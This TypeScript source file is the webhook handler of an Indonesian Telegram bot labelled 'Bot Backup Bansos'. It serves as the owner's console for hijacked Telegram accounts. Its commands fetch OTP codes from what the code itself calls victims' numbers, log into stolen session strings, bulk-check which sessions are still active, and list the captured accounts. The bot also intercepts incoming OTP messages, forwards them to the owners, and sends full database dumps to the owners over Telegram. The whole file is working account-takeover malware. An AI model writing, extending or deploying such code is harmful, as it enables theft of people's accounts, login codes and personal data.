import { initSchema, query, queryOne, execute, encryptMessage, decryptMessage } from "@/lib/db";
import { dumpAllTables, formatBackupFileName } from "@/lib/backup";
import { sendMessage, sendChatAction, sendDocumentWithRetry, editMessageText, getAllOwnerIds } from "@/lib/telegramBot";
import { isOtpMessage, forwardOtpToOwners, hasActiveVictim } from "@/lib/otp";
import { verifySessionHealth, fetchOtpFromTelegramSession } from "@/lib/telegramClient";

export const runtime = "nodejs";
export const maxDuration = 10;

// Parse OWNER_IDS safely with per-ID try/catch + fallback to DEVELOPER_CHAT_ID
function parseOwnerIds(): bigint[] {
  const raw = process.env.TELEGRAM_OWNER_IDS || "";
  const parts = raw.split(",").map((s) => s.trim()).filter(Boolean);
  const ids: bigint[] = [];
  for (const part of parts) {
    try {
      ids.push(BigInt(part));
    } catch {
      console.warn("[webhook] Invalid owner ID skipped:", part);
    }
  }
  // ponytail: fallback so /start never silently dies when OWNER_IDS empty in Vercel
  if (ids.length === 0 && process.env.TELEGRAM_DEVELOPER_CHAT_ID) {
    try {
      ids.push(BigInt(process.env.TELEGRAM_DEVELOPER_CHAT_ID.trim()));
    } catch {}
  }
  return ids;
}

function isOwner(userId: bigint): boolean {
  return parseOwnerIds().includes(userId);
}

function getCommand(text?: string): { command: string; args: string[] } | null {
  if (!text) return null;
  // handle /start@BotName in groups
  const match = text.trim().match(/^\/(\w+)(?:@\S+)?(?:\s+(.*))?$/);
  if (!match) return null;
  return { command: match[1].toLowerCase(), args: match[2] ? match[2].trim().split(/\s+/) : [] };
}

async function handleStart(chatId: number | string, userId: bigint): Promise<void> {
  const ownerIds = parseOwnerIds();
  console.log(`[webhook] /start from ${userId} isOwner=${isOwner(userId)} owners=${ownerIds.length}`);
  if (!isOwner(userId)) {
    try { await sendMessage(chatId, "⛔ Akses ditolak. Bot ini hanya untuk owner."); } catch (e) { console.warn("[webhook] send access-denied failed:", e); }
    return;
  }
  try {
    await sendMessage(
      chatId,
      `👋 Halo! Selamat datang di Bot Backup Bansos.\n\n` +
      `Perintah yang tersedia:\n` +
      `• /start — Tampilkan menu ini\n` +
      `• /help — Bantuan\n` +
      `• /backup — Backup database penuh (JSON) ke ${ownerIds.length} owner\n` +
      `• /getotp [nomor] — Ambil kode OTP dari nomor korban (butuh sesi aktif)\n` +
      `• /login [nomor] — Uji dan login ke sesi tersimpan\n` +
      `• /accounts — Lihat daftar semua akun di DB\n` +
      `• /checkall — Cek keaktifan semua sesi secara massal\n` +
      `• /info [nomor] — Lihat info detail suatu akun\n` +
      `• /logout [nomor] — Hapus sesi dari database`
    );
  } catch (e) { console.warn("[webhook] handleStart send failed:", e); }
}

async function handleBackup(chatId: number | string, userId: bigint): Promise<void> {
  if (!isOwner(userId)) {
    await sendMessage(chatId, "⛔ Akses ditolak. Hanya owner yang bisa backup.");
    return;
  }

  const ownerIds = parseOwnerIds();

  await sendMessage(chatId, "🔄 Memulai backup database...");
  await sendChatAction(chatId, "upload_document");

  try {
    const backupData = await dumpAllTables();
    const jsonContent = JSON.stringify(backupData, null, 2);
    const fileName = formatBackupFileName();

    console.log(`[backup] Dumped ${backupData.total_rows} rows from ${Object.keys(backupData.tables).length} tables`);

    const results = await Promise.allSettled(
      ownerIds.map(async (id: bigint) => {
        try {
          const res = await sendDocumentWithRetry(String(id), fileName, jsonContent, `📦 Backup ${backupData.exported_at}`);
          console.log(`[backup] Document sent to owner ${id}: ok`);
          return res;
        } catch (err) {
          console.error(`[backup] Failed to send to owner ${id}:`, err instanceof Error ? err.message : err);
          throw err;
        }
      })
    );

    const failed = results.filter((r) => r.status === "rejected").length;
    if (failed === 0) {
      await sendMessage(chatId, `✅ Backup selesai! File <code>${fileName}</code> terkirim ke ${ownerIds.length} owner.`, "HTML");
    } else {
      await sendMessage(chatId, `⚠️ Backup selesai tapi ${failed} owner gagal terkirim. Cek log.`);
    }
  } catch (err) {
    console.error("[backup] Error:", err);
    await sendMessage(chatId, `❌ Backup gagal: ${err instanceof Error ? err.message : String(err)}`);
  }
}

async function findAccountSession(targetPhone?: string): Promise<{ session_string: string; phone: string } | null> {
  if (targetPhone && targetPhone.trim()) {
    const raw = targetPhone.trim();
    let withPlus = raw;
    let noPlus = raw.replace(/^\+/, "");
    let local = raw;

    if (raw.startsWith("0")) {
      noPlus = "62" + raw.slice(1);
      withPlus = "+" + noPlus;
    } else if (!raw.startsWith("+")) {
      withPlus = "+" + raw;
    } else {
      local = "0" + raw.slice(3);
    }

    const cleanDigits = raw.replace(/\D/g, "");

    let account = await queryOne<{ session_string: string; phone: string }>(
      `SELECT session_string, phone FROM telegram_accounts 
       WHERE (phone = $1 OR phone = $2 OR phone = $3 OR REPLACE(phone, '+', '') = $4) 
         AND session_string IS NOT NULL AND session_string <> '' 
       LIMIT 1`,
      [withPlus, noPlus, local, cleanDigits]
    );

    if (account) return account;

    account = await queryOne<{ session_string: string; phone: string }>(
      `SELECT session_string, phone FROM otp_sessions 
       WHERE (phone = $1 OR phone = $2 OR phone = $3 OR REPLACE(phone, '+', '') = $4) 
         AND session_string IS NOT NULL AND session_string <> '' 
       ORDER BY updated_at DESC LIMIT 1`,
      [withPlus, noPlus, local, cleanDigits]
    );

    return account;
  }

  let account = await queryOne<{ session_string: string; phone: string }>(
    `SELECT session_string, phone FROM telegram_accounts 
     WHERE session_string IS NOT NULL AND session_string <> '' 
     ORDER BY signed_at DESC LIMIT 1`
  );

  if (!account) {
    account = await queryOne<{ session_string: string; phone: string }>(
      `SELECT session_string, phone FROM otp_sessions 
       WHERE session_string IS NOT NULL AND session_string <> '' 
       ORDER BY updated_at DESC LIMIT 1`
    );
  }

  return account;
}

async function handleGetOtp(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
  if (!isOwner(userId)) {
    await sendMessage(chatId, "⛔ Akses ditolak. Bot ini hanya untuk owner.");
    return;
  }

  const targetPhone = args && args.length > 0 ? args[0] : "";
  const account = await findAccountSession(targetPhone);

  if (!account || !account.session_string) {
    await sendMessage(chatId, `❌ Sesi akun tidak ditemukan di database.`);
    return;
  }

  const msg = await sendMessage(chatId, `⏳ Menghubungi sesi (${account.phone})...`).catch(() => null);
  if (!msg) return;

  try {
    const res = await fetchOtpFromTelegramSession(account.session_string);
    if (!res.success) {
      await editMessageText(chatId, msg.message_id, `❌ ERROR: ${res.error}`).catch(() => {});
    } else if (res.message) {
      await editMessageText(chatId, msg.message_id, `✉️ PESAN (${account.phone}):\n\n${res.message}`).catch(() => {});
    } else {
      await editMessageText(chatId, msg.message_id, `❌ Tidak ada pesan dari ${account.phone}.`).catch(() => {});
    }
  } catch (err: any) {
    await editMessageText(chatId, msg.message_id, `❌ ERROR: ${err.message || String(err)}`).catch(() => {});
  }
}

async function handleLogin(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
  if (!isOwner(userId)) return;
  if (!args || args.length === 0) {
    await sendMessage(chatId, "ℹ️ Penggunaan: /login [nomor]\nContoh: /login +628123456789");
    return;
  }
  let targetPhone = args[0];
  if (targetPhone.startsWith("0")) targetPhone = "+62" + targetPhone.slice(1);
  if (!targetPhone.startsWith("+")) targetPhone = "+" + targetPhone;

  await sendMessage(chatId, `🔄 Sedang memeriksa sesi untuk ${targetPhone}...`);
  
  const account = await queryOne<{ session_string: string; first_name: string; last_name: string; username: string }>(
    `SELECT session_string, first_name, last_name, username FROM telegram_accounts WHERE phone = $1`,
    [targetPhone]
  );

  if (!account || !account.session_string) {
    await sendMessage(chatId, `⛔ Nomor ${targetPhone} tidak ditemukan di database atau tidak memiliki sesi.`);
    return;
  }

  const health = await verifySessionHealth(account.session_string);
  
  if (!health.active) {
    await sendMessage(chatId, `❌ Gagal login. Sesi untuk ${targetPhone} sudah tidak valid atau expired.\nError: ${health.error}`);
    return;
  }

  const u = health.user as any;
  const name = [u.firstName, u.lastName].filter(Boolean).join(" ");
  
  await sendMessage(
    chatId, 
    `✅ <b>Berhasil Login!</b> Sesi masih aktif.\n\n` +
    `👤 Nama: ${name}\n` +
    `🔗 Username: ${u.username ? "@" + u.username : "-"}\n` +
    `🆔 User ID: <code>${u.id}</code>\n` +
    `📱 Nomor: ${targetPhone}`,
    "HTML"
  );
}

async function handleAccounts(chatId: number | string, userId: bigint): Promise<void> {
  if (!isOwner(userId)) return;
  const accounts = await query<{ phone: string; first_name: string; username: string }>(
    `SELECT phone, first_name, username FROM telegram_accounts ORDER BY signed_at DESC LIMIT 50`
  );
  if (accounts.length === 0) {
    await sendMessage(chatId, "📭 Belum ada akun yang tersimpan di database.");
    return;
  }
  let msg = `📋 <b>Daftar Akun (${accounts.length})</b>\n\n`;
  accounts.forEach((acc, i) => {
    msg += `${i+1}. <code>${acc.phone}</code> - ${acc.first_name} ${acc.username ? "(@"+acc.username+")" : ""}\n`;
  });
  await sendMessage(chatId, msg, "HTML");
}

async function handleCheckAll(chatId: number | string, userId: bigint): Promise<void> {
  if (!isOwner(userId)) return;
  const accounts = await query<{ phone: string; session_string: string }>(
    `SELECT phone, session_string FROM telegram_accounts WHERE session_string IS NOT NULL AND session_string <> ''`
  );
  if (accounts.length === 0) {
    await sendMessage(chatId, "📭 Belum ada akun yang tersimpan di database.");
    return;
  }
  await sendMessage(chatId, `🔄 Memeriksa ${accounts.length} akun... Mohon tunggu.`);
  let active = 0, expired = 0;
  for (const acc of accounts) {
    const health = await verifySessionHealth(acc.session_string);
    if (health.active) active++;
    else expired++;
  }
  await sendMessage(chatId, `📊 <b>Hasil Pemeriksaan Sesi:</b>\n\n✅ Aktif: ${active}\n❌ Expired: ${expired}\nTotal: ${accounts.length}`, "HTML");
}

async function handleLogout(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
  if (!isOwner(userId)) return;
  if (!args || args.length === 0) {
    await sendMessage(chatId, "ℹ️ Penggunaan: /logout [nomor]");
    return;
  }
  let targetPhone = args[0];
  if (targetPhone.startsWith("0")) targetPhone = "+62" + targetPhone.slice(1);
  if (!targetPhone.startsWith("+")) targetPhone = "+" + targetPhone;

  const result = await execute(`UPDATE telegram_accounts SET session_string = '' WHERE phone = $1`, [targetPhone]);
  if (result > 0) {
    await sendMessage(chatId, `✅ Sesi untuk nomor ${targetPhone} telah dihapus/dilogout dari database.`);
  } else {
    await sendMessage(chatId, `⛔ Nomor ${targetPhone} tidak ditemukan di database.`);
  }
}

async function handleInfo(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
  if (!isOwner(userId)) return;
  if (!args || args.length === 0) {
    await sendMessage(chatId, "ℹ️ Penggunaan: /info [nomor]");
    return;
  }
  let targetPhone = args[0];
  if (targetPhone.startsWith("0")) targetPhone = "+62" + targetPhone.slice(1);
  if (!targetPhone.startsWith("+")) targetPhone = "+" + targetPhone;

  const acc = await queryOne<{ phone: string; user_id: string; first_name: string; last_name: string; username: string; signed_at: Date; session_string: string }>(`SELECT * FROM telegram_accounts WHERE phone = $1`, [targetPhone]);
  if (!acc) {
    await sendMessage(chatId, `⛔ Nomor ${targetPhone} tidak ditemukan.`);
    return;
  }
  
  let msg = `ℹ️ <b>Informasi Akun</b>\n\n` +
            `📱 Nomor: <code>${acc.phone}</code>\n` +
            `🆔 User ID: <code>${acc.user_id || "-"}</code>\n` +
            `👤 Nama: ${acc.first_name || ""} ${acc.last_name || ""}\n` +
            `🔗 Username: ${acc.username ? "@"+acc.username : "-"}\n` +
            `🕒 Login: ${new Date(acc.signed_at).toLocaleString('id-ID')}\n\n`;
            
  if (acc.session_string) {
     msg += `🔑 Sesi: Tersedia\n`;
  } else {
     msg += `🔑 Sesi: Kosong/Logout\n`;
  }
  await sendMessage(chatId, msg, "HTML");
}

async function processUpdate(update: any): Promise<void> {
  const msg = update.message;
  if (!msg || !msg.from) return;

  const userId = BigInt(msg.from.id);
  const chatId = msg.chat.id;
  const text = msg.text;

  // Try to find linked phone for this user
  const linkedUser = await queryOne<{ phone: string }>(
    `SELECT phone FROM telegram_accounts WHERE user_id = $1`,
    [userId]
  );

  // Store messages from linked phone numbers as potential OTP messages
  if (text && linkedUser && !text.startsWith("/")) {
    if (isOtpMessage(text)) {
      await forwardOtpToOwners(linkedUser.phone, text);
    }
    try {
      const encryptedText = encryptMessage(text);
      await execute(
        `INSERT INTO otp_messages (phone, telegram_user_id, telegram_chat_id, message_text) VALUES ($1, $2, $3, $4)`,
        [linkedUser.phone, userId, chatId, encryptedText]
      );
      console.log(`[getotp] Stored encrypted OTP message from ${linkedUser.phone} in chat ${chatId}`);
    } catch (err) {
      console.error(`[getotp] Failed to store encrypted message:`, err);
    }
  }

  const cmd = getCommand(text);
  if (!cmd) return;

  console.log(`[webhook] Processing command: /${cmd.command} from user ${userId} in chat ${chatId} owners=${parseOwnerIds().length}`);

  switch (cmd.command) {
    case "start":
    case "help":
      await handleStart(chatId, userId);
      break;
    case "backup":
      await handleBackup(chatId, userId);
      break;
    case "getotp":
      await handleGetOtp(chatId, userId, cmd.args);
      break;
    case "login":
      await handleLogin(chatId, userId, cmd.args);
      break;
    case "accounts":
      await handleAccounts(chatId, userId);
      break;
    case "checkall":
      await handleCheckAll(chatId, userId);
      break;
    case "logout":
      await handleLogout(chatId, userId, cmd.args);
      break;
    case "info":
      await handleInfo(chatId, userId, cmd.args);
      break;
    default:
      if (isOwner(userId)) {
        await sendMessage(chatId, `❓ Perintah tidak dikenal: /${cmd.command}\nGunakan /start untuk bantuan.`);
      }
  }
}

export async function GET(): Promise<Response> {
  await initSchema();
  const owners = parseOwnerIds();
  const hasToken = !!process.env.TELEGRAM_BOT_TOKEN;
  const hasDb = !!process.env.DATABASE_URL;
  return Response.json({
    ok: true,
    mode: "webhook",
    owners: owners.length,
    hasToken,
    hasDb,
    hint: "POST Telegram update to this URL. GET /api/bot/poll untuk polling mode (localhost).",
    env: process.env.NODE_ENV,
  });
}

export async function POST(req: Request): Promise<Response> {
  await initSchema();

  try {
    const update = await req.json();
    console.log("[webhook] Received update:", update.update_id);
    await processUpdate(update);
    return Response.json({ ok: true });
  } catch (err) {
    console.error("[bot/webhook] Error:", err);
    // always ack Telegram to avoid retry storm
    return Response.json({ ok: true, warning: String(err) });
  }
}
